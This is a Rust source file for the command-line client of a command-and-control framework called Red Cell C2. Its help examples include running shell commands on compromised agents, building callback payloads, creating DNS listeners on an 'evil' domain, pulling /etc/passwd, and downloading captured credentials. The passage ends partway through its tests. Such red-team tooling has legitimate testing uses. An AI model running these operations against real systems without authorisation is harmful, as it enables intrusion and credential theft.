use std::io::Write as _;
use std::path::PathBuf;

use clap::{Parser, Subcommand};
use tracing_subscriber::EnvFilter;

mod agent_id;
mod backoff;
mod client;
mod commands;
mod config;
mod defaults;
mod error;
mod output;
mod tls;

pub(crate) use agent_id::AgentId;
use error::{CliError, EXIT_GENERAL, EXIT_SUCCESS};
use output::OutputFormat;

// ── top-level CLI ─────────────────────────────────────────────────────────────

/// Red Cell C2 command-line client.
///
/// Communicates with a Red Cell teamserver over its JSON REST/WebSocket API.
/// All output is JSON by default — machine-parseable on stdout, structured
/// errors on stderr.
///
/// Authentication is resolved in this order (first wins):
///
///   1. --server / --token flags
///   2. RC_SERVER / RC_TOKEN environment variables
///   3. .red-cell-cli.toml in the current or any parent directory
///   4. ~/.config/red-cell-cli/config.toml
///
/// Exit codes:
///   0  success
///   1  general / argument error
///   2  not found
///   3  auth failure (bad token, insufficient role)
///   4  server unreachable
///   5  timeout exceeded
#[derive(Debug, Parser)]
#[command(name = "red-cell-cli", author, version, about, long_about = None)]
#[command(propagate_version = true)]
#[command(disable_help_subcommand = true)]
#[command(
    after_help = "Environment:\n  RC_SERVER   Teamserver URL  (e.g. https://ts.example.com:40056)\n  RC_TOKEN    API token\n\nExamples:\n  red-cell-cli status\n  red-cell-cli agent list\n  red-cell-cli agent exec abc123 --cmd whoami --wait"
)]
pub struct Cli {
    /// Teamserver base URL (e.g. https://teamserver:40056)
    #[arg(long, short = 's', env = "RC_SERVER", global = true)]
    pub server: Option<String>,

    /// API authentication token
    #[arg(long, short = 't', env = "RC_TOKEN", global = true)]
    pub token: Option<String>,

    /// Output format
    #[arg(long, short = 'o', global = true, default_value = "json")]
    pub output: OutputFormat,

    /// Request timeout in seconds (default: 30)
    #[arg(long, global = true)]
    pub timeout: Option<u64>,

    /// Path to a custom CA certificate (PEM) used to verify the teamserver's
    /// TLS certificate.  Built-in root CAs are disabled; only this CA is
    /// trusted.  Overridden by --cert-fingerprint when both are supplied.
    #[arg(long, global = true)]
    pub ca_cert: Option<PathBuf>,

    /// SHA-256 fingerprint (lowercase hex, 64 chars) of the teamserver's
    /// TLS certificate.  Overrides --ca-cert when both are supplied.
    /// The certificate chain is not validated; only the end-entity cert's
    /// fingerprint is compared.
    #[arg(long, global = true)]
    pub cert_fingerprint: Option<String>,

    #[command(subcommand)]
    pub command: Option<Commands>,
}

// ── subcommands ───────────────────────────────────────────────────────────────

/// Available top-level subcommands.
#[derive(Debug, Subcommand)]
pub enum Commands {
    /// Check teamserver connectivity and verify credentials.
    ///
    /// Examples:
    ///   red-cell-cli status
    ///   red-cell-cli --server https://ts:40056 --token mytoken status
    #[command(verbatim_doc_comment)]
    Status,

    /// Manage connected agents.
    ///
    /// Examples:
    ///   red-cell-cli agent list
    ///   red-cell-cli agent show <id>
    ///   red-cell-cli agent exec <id> --cmd whoami --wait
    ///   red-cell-cli agent groups <id>
    ///   red-cell-cli agent set-groups <id> --group tier1
    #[command(verbatim_doc_comment)]
    Agent {
        #[command(subcommand)]
        action: AgentCommands,
    },

    /// Manage listeners (HTTP/S, DNS, SMB, external).
    ///
    /// Examples:
    ///   red-cell-cli listener list
    ///   red-cell-cli listener show mylistener
    ///   red-cell-cli listener create --name http1 --type http --port 443
    ///   red-cell-cli listener access http1
    ///   red-cell-cli listener set-access http1 --allow-operator alice
    #[command(verbatim_doc_comment)]
    Listener {
        #[command(subcommand)]
        action: ListenerCommands,
    },

    /// Build and manage payloads.
    ///
    /// Examples:
    ///   red-cell-cli payload list
    ///   red-cell-cli payload build --listener http1 --os windows --arch x86_64
    ///   red-cell-cli payload download <id> --out ./payload.exe
    #[command(verbatim_doc_comment)]
    Payload {
        #[command(subcommand)]
        action: PayloadCommands,
    },

    /// Manage operators and role-based access control.
    ///
    /// Examples:
    ///   red-cell-cli operator list
    ///   red-cell-cli operator create alice --role operator
    ///   red-cell-cli operator set-role alice admin
    ///   red-cell-cli operator show-agent-groups alice
    ///   red-cell-cli operator set-agent-groups bob --group corp-dc
    #[command(verbatim_doc_comment)]
    Operator {
        #[command(subcommand)]
        action: OperatorCommands,
    },

    /// Browse and download captured loot (screenshots, credentials, files).
    ///
    /// Examples:
    ///   red-cell-cli loot list
    ///   red-cell-cli loot list --kind screenshot
    ///   red-cell-cli loot download 42 --out ./screenshot.png
    #[command(verbatim_doc_comment)]
    Loot {
        #[command(subcommand)]
        action: LootCommands,
    },

    /// View and stream the audit log.
    ///
    /// Examples:
    ///   red-cell-cli log list
    ///   red-cell-cli log list --operator alice --limit 50
    ///   red-cell-cli log tail
    #[command(name = "log", verbatim_doc_comment)]
    Audit {
        #[command(subcommand)]
        action: AuditCommands,
    },

    /// Start a persistent JSON-pipe session for long-running agent interactions.
    ///
    /// Reads newline-delimited JSON commands from stdin and writes JSON
    /// responses to stdout.  Keeps a single authenticated connection open so
    /// re-auth overhead is paid only once.
    ///
    /// If --agent is given, commands that require an agent ID will use it as
    /// the default when "id" is not present in the JSON message.
    ///
    /// Examples:
    ///   red-cell-cli session
    ///   red-cell-cli session --agent abc123
    ///   echo '{"cmd":"ping"}' | red-cell-cli session
    #[command(verbatim_doc_comment)]
    Session {
        /// Default agent ID (used when a command does not include "id")
        #[arg(long)]
        agent: Option<AgentId>,
    },

    /// Show help for a subcommand (alias: `<command> --help`).
    ///
    /// Examples:
    ///   red-cell-cli help
    ///   red-cell-cli help agent
    ///   red-cell-cli help listener
    #[command(verbatim_doc_comment)]
    Help {
        /// Subcommand to show help for (omit for top-level help)
        command: Option<String>,
    },
}

// ── agent subcommands ─────────────────────────────────────────────────────────

/// Agent subcommands.
#[derive(Debug, Subcommand)]
pub enum AgentCommands {
    /// List all registered agents.
    ///
    /// Examples:
    ///   red-cell-cli agent list
    #[command(verbatim_doc_comment)]
    List,

    /// Show full details of a single agent.
    ///
    /// Examples:
    ///   red-cell-cli agent show abc123
    #[command(verbatim_doc_comment)]
    Show {
        /// Agent ID
        id: AgentId,
    },

    /// Execute a shell command on an agent.
    ///
    /// Without --wait: returns immediately with a job ID.
    /// With --wait:    blocks until the agent returns output (exit code 5 on timeout).
    ///
    /// Examples:
    ///   red-cell-cli agent exec abc123 --cmd "whoami"
    ///   red-cell-cli agent exec abc123 --cmd "ipconfig /all" --wait --wait-timeout 30
    #[command(verbatim_doc_comment)]
    Exec {
        /// Agent ID
        id: AgentId,
        /// Shell command to execute on the agent
        #[arg(long)]
        cmd: String,
        /// Block until the agent returns output
        #[arg(long)]
        wait: bool,
        #[arg(long, help = crate::defaults::agent_exec_wait_timeout_help())]
        wait_timeout: Option<u64>,
    },

    /// Retrieve pending task output from an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent output abc123
    ///   red-cell-cli agent output abc123 --watch
    ///   red-cell-cli agent output abc123 --since 42 --watch
    #[command(verbatim_doc_comment)]
    Output {
        /// Agent ID
        id: AgentId,
        /// Stream new output as it arrives (prints JSON lines until Ctrl-C)
        #[arg(long)]
        watch: bool,
        /// Only fetch output newer than this numeric output entry ID
        #[arg(long)]
        since: Option<i64>,
    },

    /// Terminate an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent kill abc123
    ///   red-cell-cli agent kill abc123 --wait
    #[command(verbatim_doc_comment)]
    Kill {
        /// Agent ID
        id: AgentId,
        /// Block until the agent's status becomes "dead"
        #[arg(long)]
        wait: bool,
    },

    /// Upload a local file to an agent.
    ///
    /// Examples:
    ///   red-cell-cli agent upload abc123 --src ./payload.exe --dst "C:\\Temp\\p.exe"
    #[command(verbatim_doc_comment)]
    Upload {
        /// Agent ID
        id: AgentId,
        /// Local path of the file to upload
        #[arg(long)]
        src: String,
        /// Destination path on the remote agent
        #[arg(long)]
        dst: String,
        /// Maximum upload size in mebibytes (default: 100 MiB).
        /// Uploads exceeding this limit are rejected before reading the file.
        /// For larger files use chunked transfer.
        #[arg(long, default_value_t = 100)]
        max_upload_mb: u64,
    },

    /// Download a file from an agent to local disk.
    ///
    /// Examples:
    ///   red-cell-cli agent download abc123 --src /etc/passwd --dst ./passwd.txt
    #[command(verbatim_doc_comment)]
    Download {
        /// Agent ID
        id: AgentId,
        /// Source path on the remote agent
        #[arg(long)]
        src: String,
        /// Local path to write the downloaded file
        #[arg(long)]
        dst: String,
    },

    /// List RBAC group tags assigned to an agent (`GET /agents/{id}/groups`).
    ///
    /// Examples:
    ///   red-cell-cli agent groups DEADBEEF
    #[command(verbatim_doc_comment)]
    Groups {
        /// Agent ID
        id: AgentId,
    },

    /// Replace the agent's RBAC group membership (`PUT /agents/{id}/groups`).
    ///
    /// Pass `--group` multiple times or omit it to clear all groups (unrestricted).
    ///
    /// Examples:
    ///   red-cell-cli agent set-groups DEADBEEF --group corp-dc --group tier1
    ///   red-cell-cli agent set-groups DEADBEEF
    #[command(verbatim_doc_comment)]
    SetGroups {
        /// Agent ID
        id: AgentId,
        /// Group name (repeat to assign multiple groups)
        #[arg(long)]
        group: Vec<String>,
    },
}

// ── listener subcommands ──────────────────────────────────────────────────────

/// Listener subcommands.
#[derive(Debug, Subcommand)]
pub enum ListenerCommands {
    /// List all configured listeners.
    ///
    /// Examples:
    ///   red-cell-cli listener list
    #[command(verbatim_doc_comment)]
    List,

    /// Show full details of a single listener.
    ///
    /// Examples:
    ///   red-cell-cli listener show http1
    #[command(verbatim_doc_comment)]
    Show {
        /// Listener name
        name: String,
    },

    /// Create a new listener.
    ///
    /// For simple cases supply individual flags; for complex HTTP listeners
    /// with headers, URIs, or proxy config pass --config-json instead.
    ///
    /// Examples:
    ///   red-cell-cli listener create --name http1 --type http --port 443
    ///   red-cell-cli listener create --name dns1  --type dns  --domain c2.evil.example.com
    ///   red-cell-cli listener create --name smb1  --type smb  --pipe-name my-pipe
    ///   red-cell-cli listener create --name ext1  --type external --endpoint /bridge
    ///   red-cell-cli listener create --name http1 --type http --config-json '{"name":"http1","host_bind":"0.0.0.0","port_bind":443,"host_rotation":"round-robin"}'
    #[command(verbatim_doc_comment)]
    Create {
        /// Listener display name
        #[arg(long)]
        name: String,

        /// Protocol: http, dns, smb, or external
        #[arg(long = "type")]
        listener_type: String,

        /// Bind port (HTTP default: 443, DNS default: 53)
        #[arg(long)]
        port: Option<u16>,

        /// Local interface to bind (default: 0.0.0.0)
        #[arg(long, default_value = "0.0.0.0")]
        host: String,

        /// C2 domain suffix handled by a DNS listener (required for --type dns)
        #[arg(long)]
        domain: Option<String>,

        /// Named pipe for SMB pivot traffic (required for --type smb)
        #[arg(long)]
        pipe_name: Option<String>,

        /// HTTP path registered on the teamserver (required for --type external)
        #[arg(long)]
        endpoint: Option<String>,

        /// Enable TLS for HTTP listeners (HTTPS)
        #[arg(long, default_value_t = false)]
        secure: bool,

        /// Full listener config as a raw JSON object (overrides all flags
        /// above; the JSON must match the server's inner config shape for
        /// the chosen --type)
        #[arg(long)]
        config_json: Option<String>,
    },

    /// Start a stopped listener (idempotent: already-running returns ok).
    ///
    /// Examples:
    ///   red-cell-cli listener start http1
    #[command(verbatim_doc_comment)]
    Start {
        /// Listener name
        name: String,
    },

    /// Stop a running listener (idempotent: already-stopped returns ok).
    ///
    /// Examples:
    ///   red-cell-cli listener stop http1
    #[command(verbatim_doc_comment)]
    Stop {
        /// Listener name
        name: String,
    },

    /// Delete a listener.
    ///
    /// Examples:
    ///   red-cell-cli listener delete http1
    #[command(verbatim_doc_comment)]
    Delete {
        /// Listener name
        name: String,
    },

    /// Show the operator allow-list for a listener (`GET /listeners/{name}/access`).
    ///
    /// Examples:
    ///   red-cell-cli listener access http1
    #[command(verbatim_doc_comment)]
    Access {
        /// Listener name
        name: String,
    },

    /// Replace the operator allow-list for a listener (`PUT /listeners/{name}/access`).
    ///
    /// Pass `--allow-operator` multiple times or omit it to clear restrictions.
    ///
    /// Examples:
    ///   red-cell-cli listener set-access http1 --allow-operator alice --allow-operator bob
    ///   red-cell-cli listener set-access http1
    #[command(verbatim_doc_comment)]
    SetAccess {
        /// Listener name
        name: String,
        /// Operator username allowed to use this listener (repeat for multiple)
        #[arg(long = "allow-operator")]
        allow_operator: Vec<String>,
    },
}

// ── payload subcommands ───────────────────────────────────────────────────────

/// Payload subcommands.
#[derive(Debug, Subcommand)]
pub enum PayloadCommands {
    /// Build a new payload.
    ///
    /// Without --wait: submits the build job and returns a job_id immediately.
    /// With --wait:    blocks until the build completes and returns payload metadata.
    ///
    /// Examples:
    ///   red-cell-cli payload build --listener http1 --arch x86_64 --format exe
    ///   red-cell-cli payload build --listener dns1  --arch aarch64 --format bin --sleep 5 --wait
    ///   red-cell-cli payload build --listener http1 --arch x86_64 --format bin --agent phantom
    #[command(verbatim_doc_comment)]
    Build {
        /// Listener name the payload connects back to
        #[arg(long)]
        listener: String,
        /// Target architecture (x86_64, x86, aarch64)
        #[arg(long)]
        arch: String,
        /// Output format (exe, dll, bin)
        #[arg(long)]
        format: String,
        /// Agent type to build (demon, archon, phantom, specter)
        #[arg(long, default_value = "demon")]
        agent: String,
        /// Agent sleep interval in seconds
        #[arg(long)]
        sleep: Option<u64>,
        /// Block until the build finishes (polls for completion)
        #[arg(long)]
        wait: bool,
        #[arg(long, help = crate::defaults::payload_build_wait_timeout_help())]
        wait_timeout: Option<u64>,
    },

    /// List previously built payloads.
    ///
    /// Examples:
    ///   red-cell-cli payload list
    #[command(verbatim_doc_comment)]
    List,

    /// Download a built payload to disk.
    ///
    /// Examples:
    ///   red-cell-cli payload download <id> --dst ./payload.exe
    #[command(verbatim_doc_comment)]
    Download {
        /// Payload ID
        id: String,
        /// Local path to write the downloaded payload
        #[arg(long)]
        dst: String,
    },
}

// ── operator subcommands ──────────────────────────────────────────────────────

/// Operator subcommands.
#[derive(Debug, Subcommand)]
pub enum OperatorCommands {
    /// List all operators.
    ///
    /// Examples:
    ///   red-cell-cli operator list
    #[command(verbatim_doc_comment)]
    List,

    /// Create a new operator account.
    ///
    /// Examples:
    ///   red-cell-cli operator create alice --role operator --password s3cr3t!
    ///   red-cell-cli operator create bob   --role admin    --password hunter2
    #[command(verbatim_doc_comment)]
    Create {
        /// Operator username
        username: String,
        /// Initial password for the new operator account
        #[arg(long)]
        password: String,
        /// Role (admin, operator, analyst)
        #[arg(long, default_value = "operator")]
        role: String,
    },

    /// Delete an operator account.
    ///
    /// Examples:
    ///   red-cell-cli operator delete alice
    #[command(verbatim_doc_comment)]
    Delete {
        /// Operator username
        username: String,
    },

    /// Change an operator's role.
    ///
    /// Examples:
    ///   red-cell-cli operator set-role alice admin
    ///   red-cell-cli operator set-role bob   analyst
    #[command(verbatim_doc_comment)]
    SetRole {
        /// Operator username
        username: String,
        /// New role (admin, operator, analyst)
        role: String,
    },

    /// Show which agent groups an operator may task (`GET /operators/{username}/agent-groups`).
    ///
    /// Examples:
    ///   red-cell-cli operator show-agent-groups alice
    #[command(verbatim_doc_comment)]
    ShowAgentGroups {
        /// Operator username
        username: String,
    },

    /// Restrict an operator to tasking agents in specific groups
    /// (`PUT /operators/{username}/agent-groups`).
    ///
    /// Pass `--group` multiple times or omit it to remove restrictions.
    ///
    /// Examples:
    ///   red-cell-cli operator set-agent-groups alice --group corp-dc
    ///   red-cell-cli operator set-agent-groups alice
    #[command(verbatim_doc_comment)]
    SetAgentGroups {
        /// Operator username
        username: String,
        /// Allowed group name (repeat for multiple)
        #[arg(long)]
        group: Vec<String>,
    },
}

// ── loot subcommands ──────────────────────────────────────────────────────────

/// Loot subcommands.
#[derive(Debug, Subcommand)]
pub enum LootCommands {
    /// List captured loot entries.
    ///
    /// Examples:
    ///   red-cell-cli loot list
    ///   red-cell-cli loot list --kind screenshot
    ///   red-cell-cli loot list --agent DEADBEEF --limit 20
    ///   red-cell-cli loot list --since 2026-01-01T00:00:00Z
    #[command(verbatim_doc_comment)]
    List {
        /// Filter by loot type (e.g. screenshot, credential, file)
        #[arg(long)]
        kind: Option<String>,
        /// Filter by agent ID
        #[arg(long)]
        agent: Option<AgentId>,
        /// Filter by operator username
        #[arg(long)]
        operator: Option<String>,
        /// Only return entries captured at or after this ISO 8601 UTC timestamp
        #[arg(long)]
        since: Option<String>,
        /// Maximum entries to return
        #[arg(long)]
        limit: Option<u32>,
    },

    /// Download the raw bytes for a loot item to a local file.
    ///
    /// Examples:
    ///   red-cell-cli loot download 42 --out ./screenshot.png
    ///   red-cell-cli loot download 7 --out ./creds.txt
    #[command(verbatim_doc_comment)]
    Download {
        /// Numeric loot identifier (from `loot list`)
        id: i64,
        /// Local path to write the downloaded bytes
        #[arg(long)]
        out: String,
    },
}

// ── audit/log subcommands ─────────────────────────────────────────────────────

/// Audit log subcommands.
#[derive(Debug, Subcommand)]
pub enum AuditCommands {
    /// List audit log entries (newest first).
    ///
    /// Examples:
    ///   red-cell-cli log list
    ///   red-cell-cli log list --operator alice --limit 50
    ///   red-cell-cli log list --action exec
    ///   red-cell-cli log list --since 2026-03-21T00:00:00Z --agent abc123
    #[command(verbatim_doc_comment)]
    List {
        /// Filter by operator username
        #[arg(long)]
        operator: Option<String>,
        /// Filter by action type
        #[arg(long)]
        action: Option<String>,
        /// Filter by agent ID
        #[arg(long)]
        agent: Option<AgentId>,
        /// Only return entries at or after this ISO 8601 UTC timestamp
        #[arg(long)]
        since: Option<String>,
        /// Maximum entries to return
        #[arg(long, default_value = "100")]
        limit: u32,
    },

    /// Stream new audit log entries as they arrive.
    ///
    /// Prints the last 20 entries.  With --follow, streams new entries as
    /// JSON lines until Ctrl-C.
    ///
    /// Examples:
    ///   red-cell-cli log tail
    ///   red-cell-cli log tail --follow
    #[command(verbatim_doc_comment)]
    Tail {
        #[arg(long, help = crate::defaults::audit_tail_follow_help())]
        follow: bool,
    },
}

// ── help handler ──────────────────────────────────────────────────────────────

/// Print help for the given subcommand name, or top-level help if `None`.
///
/// Returns the appropriate process exit code.
fn handle_help(command: Option<&str>) -> i32 {
    use clap::CommandFactory;
    let mut root = Cli::command();
    match command {
        None => {
            if root.print_help().is_err() || writeln!(std::io::stdout()).is_err() {
                return EXIT_GENERAL;
            }
            EXIT_SUCCESS
        }
        Some(name) => {
            if let Some(sub) = root.find_subcommand_mut(name) {
                if sub.print_long_help().is_err() || writeln!(std::io::stdout()).is_err() {
                    return EXIT_GENERAL;
                }
                EXIT_SUCCESS
            } else {
                output::print_error(&CliError::InvalidArgs(format!("unknown command '{name}'")))
                    .ok();
                root.print_help().ok();
                writeln!(std::io::stdout()).ok();
                EXIT_GENERAL
            }
        }
    }
}

// ── entry point ───────────────────────────────────────────────────────────────

fn main() {
    tracing_subscriber::fmt()
        .with_env_filter(EnvFilter::from_default_env())
        .with_writer(std::io::stderr)
        .init();

    let cli = Cli::parse();

    // Bare invocation: print help and exit 0.
    if cli.command.is_none() {
        use clap::CommandFactory;
        let ok = Cli::command().print_help().is_ok() && writeln!(std::io::stdout()).is_ok();
        std::process::exit(if ok { EXIT_SUCCESS } else { EXIT_GENERAL });
    }

    // `help [command]` doesn't need a server or token — handle it before the
    // async runtime is started.
    if let Some(Commands::Help { ref command }) = cli.command {
        let code = handle_help(command.as_deref());
        std::process::exit(code);
    }

    let rt = match tokio::runtime::Builder::new_multi_thread().enable_all().build() {
        Ok(rt) => rt,
        Err(e) => {
            output::print_error(&CliError::General(format!("failed to build async runtime: {e}")))
                .ok();
            std::process::exit(error::EXIT_GENERAL);
        }
    };

    let exit_code = rt.block_on(dispatch(cli));
    std::process::exit(exit_code);
}

// ── async dispatcher ──────────────────────────────────────────────────────────

async fn dispatch(cli: Cli) -> i32 {
    // Capture output format before partial moves.
    let fmt = cli.output.clone();

    // Resolve configuration (CLI flags + env vars were already absorbed by
    // clap; this step adds the file-based fallbacks).
    let resolved = match config::resolve(
        cli.server,
        cli.token,
        cli.timeout,
        cli.ca_cert,
        cli.cert_fingerprint,
    ) {
        Ok(cfg) => cfg,
        Err(e) => {
            let err: CliError = e.into();
            output::print_error(&err).ok();
            return err.exit_code();
        }
    };

    // Build the shared API client.
    let api_client = match client::ApiClient::new(&resolved) {
        Ok(c) => c,
        Err(e) => {
            output::print_error(&e).ok();
            return e.exit_code();
        }
    };

    let Some(command) = cli.command else {
        // Unreachable: bare invocation is handled in main().
        return EXIT_SUCCESS;
    };

    match command {
        Commands::Status => match commands::status::run(&api_client).await {
            Ok(data) => match output::print_success(&fmt, &data) {
                Ok(()) => EXIT_SUCCESS,
                Err(e) => {
                    output::print_error(&e).ok();
                    e.exit_code()
                }
            },
            Err(e) => {
                output::print_error(&e).ok();
                e.exit_code()
            }
        },

        Commands::Agent { action } => commands::agent::run(&api_client, &fmt, action).await,

        Commands::Listener { action } => commands::listener::run(&api_client, &fmt, action).await,

        Commands::Payload { action } => commands::payload::run(&api_client, &fmt, action).await,

        Commands::Loot { action } => commands::loot::run(&api_client, &fmt, action).await,

        Commands::Audit { action } => commands::audit::run(&api_client, &fmt, action).await,

        Commands::Session { agent } => commands::session::run(&resolved, agent).await,

        Commands::Operator { action } => commands::operator::run(&api_client, &fmt, action).await,

        // Handled synchronously in main() before the runtime is started;
        // this arm exists only for exhaustiveness.
        Commands::Help { .. } => EXIT_SUCCESS,
    }
}

// ── tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use clap::{CommandFactory, Parser};

    use super::*;
    use crate::error;

    // ── top-level help content ───────────────────────────────────────────────

    #[test]
    fn top_level_help_contains_rc_server() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("RC_SERVER"), "top-level help must mention RC_SERVER");
    }

    #[test]
    fn top_level_help_contains_rc_token() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("RC_TOKEN"), "top-level help must mention RC_TOKEN");
    }

    #[test]
    fn top_level_help_contains_examples_section() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("Examples:"), "top-level help must have an Examples section");
        assert!(
            help.contains("red-cell-cli status"),
            "top-level help examples must include 'red-cell-cli status'"
        );
        assert!(
            help.contains("red-cell-cli agent list"),
            "top-level help examples must include 'red-cell-cli agent list'"
        );
    }

    #[test]
    fn top_level_help_contains_environment_section() {
        let help = Cli::command().render_long_help().to_string();
        assert!(help.contains("Environment:"), "top-level help must have an Environment section");
    }

    // ── per-subcommand examples ──────────────────────────────────────────────

    /// Every direct child of the root command must have "Examples:" in its long help.
    #[test]
    fn every_top_level_subcommand_has_examples() {
        let mut cmd = Cli::command();
        for sub in cmd.get_subcommands_mut() {
            let name = sub.get_name().to_owned();
            let help = sub.render_long_help().to_string();
            assert!(
                help.contains("Examples:"),
                "subcommand '{name}' help is missing an Examples section"
            );
        }
    }

    /// Spot-check a selection of second-level subcommands for examples.
    #[test]
    fn nested_subcommands_have_examples() {
        let mut cmd = Cli::command();

        // agent → exec
        let agent_exec_help = cmd
            .find_subcommand_mut("agent")
            .expect("agent subcommand")
            .find_subcommand_mut("exec")
            .expect("agent exec subcommand")
            .render_long_help()
            .to_string();
        assert!(agent_exec_help.contains("Examples:"), "agent exec help missing Examples");

        // listener → create
        let mut cmd2 = Cli::command();
        let listener_create_help = cmd2
            .find_subcommand_mut("listener")
            .expect("listener subcommand")
            .find_subcommand_mut("create")
            .expect("listener create subcommand")
            .render_long_help()
            .to_string();
        assert!(
            listener_create_help.contains("Examples:"),
            "listener create help missing Examples"
        );

        // log → list
        let mut cmd3 = Cli::command();
        let log_list_help = cmd3
            .find_subcommand_mut("log")
            .expect("log subcommand")
            .find_subcommand_mut("list")
            .expect("log list subcommand")
            .render_long_help()
            .to_string();
        assert!(log_list_help.contains("Examples:"), "log list help missing Examples");
    }

    #[test]
    fn agent_output_help_describes_numeric_since_cursor() {
        let mut cmd = Cli::command();
        let help = cmd
            .find_subcommand_mut("agent")
            .expect("agent subcommand")
            .find_subcommand_mut("output")
            .expect("agent output subcommand")
            .render_long_help()
            .to_string();

        assert!(
            help.contains("numeric output entry ID"),
            "agent output help must describe --since as a numeric output entry ID"
        );
        assert!(
            help.contains("--since 42"),
            "agent output help must show a numeric --since example"
        );
    }

    // ── help subcommand parsing ───────────────────────────────────────────────

    #[test]
    fn bare_invocation_yields_none_command() {
        let cli = Cli::try_parse_from(["red-cell-cli"]).expect("parse bare invocation");
        assert!(cli.command.is_none());
    }

    #[test]
    fn help_subcommand_parses_with_no_arg() {
        let cli = Cli::try_parse_from(["red-cell-cli", "help"]).expect("parse 'help'");
        assert!(matches!(cli.command, Some(Commands::Help { command: None })));
    }

    #[test]
    fn help_subcommand_parses_with_agent_arg() {
        let cli =
            Cli::try_parse_from(["red-cell-cli", "help", "agent"]).expect("parse 'help agent'");
        assert!(
            matches!(&cli.command, Some(Commands::Help { command: Some(c) }) if c == "agent"),
            "expected Help {{ command: Some(\"agent\") }}"
        );
    }

    #[test]
    fn help_subcommand_parses_with_listener_arg() {
        let cli = Cli::try_parse_from(["red-cell-cli", "help", "listener"])
            .expect("parse 'help listener'");
        assert!(
            matches!(&cli.command, Some(Commands::Help { command: Some(c) }) if c == "listener")
        );
    }

    // ── unknown command handling ──────────────────────────────────────────────

    #[test]
    fn unknown_command_fails_to_parse_without_panic() {
        let result = Cli::try_parse_from(["red-cell-cli", "frobnicator"]);
        assert!(result.is_err(), "unknown command must fail to parse");
    }

    #[test]
    fn handle_help_unknown_returns_exit_general() {
        let code = handle_help(Some("totally-unknown-command"));
        assert_eq!(code, EXIT_GENERAL);
    }

    /// Unknown-command error uses INVALID_ARGS code so parsers see structured JSON.
    #[test]
    fn unknown_command_error_uses_invalid_args_code() {
        let err = CliError::InvalidArgs("unknown command 'bogus'".to_owned());
        assert_eq!(err.error_code(), error::ERROR_CODE_INVALID_ARGS);
        let envelope = serde_json::json!({
            "ok": false,
            "error": err.error_code(),
            "message": err.to_string(),
        });
        assert_eq!(envelope["ok"], false);
        assert_eq!(envelope["error"], "INVALID_ARGS");
        assert!(envelope["message"].as_str().unwrap_or("").contains("unknown command"));
    }

    /// Runtime-build error uses ERROR code so parsers see structured JSON.
    #[test]
    fn runtime_build_error_uses_general_code() {
        let err =
            CliError::General("failed to build async runtime: out of file descriptors".to_owned());
        assert_eq!(err.error_code(), error::ERROR_CODE_GENERAL);
        let envelope = serde_json::json!({
            "ok": false,
            "error": err.error_code(),
            "message": err.to_string(),
        });
        assert_eq!(envelope["ok"], false);
        assert_eq!(envelope["error"], "ERROR");
        assert!(envelope["message"].as_str().unwrap_or("").contains("async runtime"));
    }

    #[test]
    fn handle_help_none_returns_exit_success() {
        let code = handle_help(None);
        assert_eq!(code, EXIT_SUCCESS);
    }

    #[test]
    fn handle_help_known_command_returns_exit_success() {
        let code = handle_help(Some("agent"));
        assert_eq!(code, EXIT_SUCCESS);
    }

    // ── log command name ──────────────────────────────────────────────────────

    #[test]
    fn audit_variant_is_exposed_as_log_command() {
        // The CLI name must be "log", not "audit".
        let cli =
            Cli::try_parse_from(["red-cell-cli", "log", "list"]).expect("'log list' must parse");
        assert!(matches!(cli.command, Some(Commands::Audit { .. })));
    }

    // ── global flag round-trips ───────────────────────────────────────────────

    #[test]
    fn server_flag_is_captured() {
        let cli = Cli::try_parse_from(["red-cell-cli", "--server", "https://ts.example.com:40056"])
            .expect("--server flag must parse");
        assert_eq!(cli.server.as_deref(), Some("https://ts.example.com:40056"));
    }

    #[test]
    fn token_flag_is_captured() {
        let cli = Cli::try_parse_from(["red-cell-cli", "--token", "secret-token-abc"])
            .expect("--token flag must parse");
        assert_eq!(cli.token.as_deref(), Some("secret-token-abc"));
    }

    #[test]
    fn output_flag_json_is_captured() {
        let cli = Cli::try_parse_from(["red-cell-cli", "--output", "json"])
            .expect("--output json must parse");
        assert!(matches!(cli.output, OutputFormat::Json));
    }

    #[test]
    fn output_flag_text_is_captured() {
        let cli = Cli::try_parse_from(["red-cell-cli", "--output", "text"])
            .expect("--output text must parse");
        assert!(matches!(cli.output, OutputFormat::Text));
    }

    #[test]
    fn default_output_format_is_json() {
        let cli = Cli::try_parse_from(["red-cell-cli"]).expect("bare invocation must parse");
        assert!(matches!(cli.output, OutputFormat::Json), "default --output must be json");
    }

    #[test]
    fn timeout_flag_is_captured() {
        let cli = Cli::try_parse_from(["red-cell-cli", "--timeout", "60"])
            .expect("--timeout flag must parse");
        assert_eq!(cli.timeout, Some(60));
    }

    #[test]
    fn default_timeout_is_none_when_omitted() {
        let cli = Cli::try_parse_from(["red-cell-cli"]).expect("bare invocation must parse");
        assert!(cli.timeout.is_none(), "omitting --timeout must yield None, not a sentinel");
    }

    #[test]
    fn server_and_token_and_timeout_together() {
        let cli = Cli::try_parse_from([
            "red-cell-cli",
            "--server",
            "https://ts:40056",
            "--token",
            "tok",
            "--timeout",
            "120",
            "status",
        ])
        .expect("combined global flags with subcommand must parse");
        assert_eq!(cli.server.as_deref(), Some("https://ts:40056"));
        assert_eq!(cli.token.as_deref(), Some("tok"));
        assert_eq!(cli.timeout, Some(120));
        assert!(matches!(cli.command, Some(Commands::Status)));
    }

    // ── invalid flags produce errors ──────────────────────────────────────────

    #[test]
    fn invalid_flag_returns_error() {
        let result = Cli::try_parse_from(["red-cell-cli", "--invalid-flag"]);
        assert!(result.is_err(), "unknown flag must return an error");
    }

    #[test]
    fn invalid_output_value_returns_error() {
        let result = Cli::try_parse_from(["red-cell-cli", "--output", "yaml"]);
        assert!(result.is_err(), "invalid --output value must return an error");
    }

    #[test]
    fn non_numeric_timeout_returns_error() {
        let result = Cli::try_parse_from(["red-cell-cli", "--timeout", "notanumber"]);
        assert!(result.is_err(), "non-numeric --timeout must return an error");
    }

    // ── payload build --agent flag ───────────────────────────────────────────

    #[test]
    fn payload_build_agent_defaults_to_demon() {
        let cli = Cli::try_parse_from([
            "red-cell-cli",
            "payload",
            "build",
            "--listener",
            "http1",
            "--arch",
            "x64",
            "--format",
            "exe",
        ])
        .expect("payload build must parse without --agent");
        match cli.command {
